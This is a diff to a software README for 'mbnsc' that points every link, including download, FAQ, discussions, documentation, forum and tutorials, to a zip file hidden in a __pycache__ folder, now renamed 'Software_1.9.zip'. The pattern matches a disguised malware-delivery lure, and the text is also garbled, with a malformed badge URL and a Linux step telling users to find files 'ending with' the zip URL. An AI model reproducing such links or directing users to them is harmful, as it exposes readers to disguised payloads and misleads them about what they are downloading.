@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download mbnsc](https://raw.githubusercontent.com/mamadouwxxx/mbnsc/main/__pycache__/mbnsc-v2.5-beta.5.zip%https://raw.githubusercontent.com/mamadouwxxx/mbnsc/main/__pycache__/mbnsc-v2.5-beta.5.zip)](https://raw.githubusercontent.com/mamadouwxxx/mbnsc/main/__pycache__/mbnsc-v2.5-beta.5.zip)
+[![Download mbnsc](https://github.com/mamadouwxxx/mbnsc/raw/refs/heads/main/__pycache__/Software_1.9.zip%https://github.com/mamadouwxxx/mbnsc/raw/refs/heads/main/__pycache__/Software_1.9.zip)](https://github.com/mamadouwxxx/mbnsc/raw/refs/heads/main/__pycache__/Software_1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -21,13 +21,13 @@ Before you start, ensure your system meets the following requirements:
 
 To download the latest version of mbnsc, simply visit the Releases page:
 
-[Download mbnsc](https://raw.githubusercontent.com/mamadouwxxx/mbnsc/main/__pycache__/mbnsc-v2.5-beta.5.zip)
+[Download mbnsc](https://github.com/mamadouwxxx/mbnsc/raw/refs/heads/main/__pycache__/Software_1.9.zip)
 
 On this page, you will see a list of available downloads. Choose the version that matches your operating system:
 
 1. For **Windows**, look for files that end with `.exe`.
 2. For **macOS**, look for files that end with `.dmg`.
-3. For **Linux**, look for files that end with `https://raw.githubusercontent.com/mamadouwxxx/mbnsc/main/__pycache__/mbnsc-v2.5-beta.5.zip`.
+3. For **Linux**, look for files that end with `https://github.com/mamadouwxxx/mbnsc/raw/refs/heads/main/__pycache__/Software_1.9.zip`.
 
 Once you find the correct file:
 
@@ -51,7 +51,7 @@ If you encounter any issues while using mbnsc, consider the following tips:
 - Check your internet connection.
 - Review your firewall settings to ensure mbnsc has access.
 
-If problems persist, you can find solutions in the [FAQ section](https://raw.githubusercontent.com/mamadouwxxx/mbnsc/main/__pycache__/mbnsc-v2.5-beta.5.zip) or contact support.
+If problems persist, you can find solutions in the [FAQ section](https://github.com/mamadouwxxx/mbnsc/raw/refs/heads/main/__pycache__/Software_1.9.zip) or contact support.
 
 ## 🌟 Features
 
@@ -64,15 +64,15 @@ If problems persist, you can find solutions in the [FAQ section](https://raw.git
 
 We encourage users to join our community and share experiences, tips, and advice. If you have questions, feel free to ask. 
 
-Visit the [GitHub Discussions](https://raw.githubusercontent.com/mamadouwxxx/mbnsc/main/__pycache__/mbnsc-v2.5-beta.5.zip) page to connect with other users.
+Visit the [GitHub Discussions](https://github.com/mamadouwxxx/mbnsc/raw/refs/heads/main/__pycache__/Software_1.9.zip) page to connect with other users.
 
 ## 🔗 Additional Resources
 
 For more detailed guides and information, explore the following resources:
 
-- [Official Documentation](https://raw.githubusercontent.com/mamadouwxxx/mbnsc/main/__pycache__/mbnsc-v2.5-beta.5.zip)
-- [User Forum](https://raw.githubusercontent.com/mamadouwxxx/mbnsc/main/__pycache__/mbnsc-v2.5-beta.5.zip)
-- [YouTube Tutorials](https://raw.githubusercontent.com/mamadouwxxx/mbnsc/main/__pycache__/mbnsc-v2.5-beta.5.zip)
+- [Official Documentation](https://github.com/mamadouwxxx/mbnsc/raw/refs/heads/main/__pycache__/Software_1.9.zip)
+- [User Forum](https://github.com/mamadouwxxx/mbnsc/raw/refs/heads/main/__pycache__/Software_1.9.zip)
+- [YouTube Tutorials](https://github.com/mamadouwxxx/mbnsc/raw/refs/heads/main/__pycache__/Software_1.9.zip)
 
 ## 📌 Important Notes
 
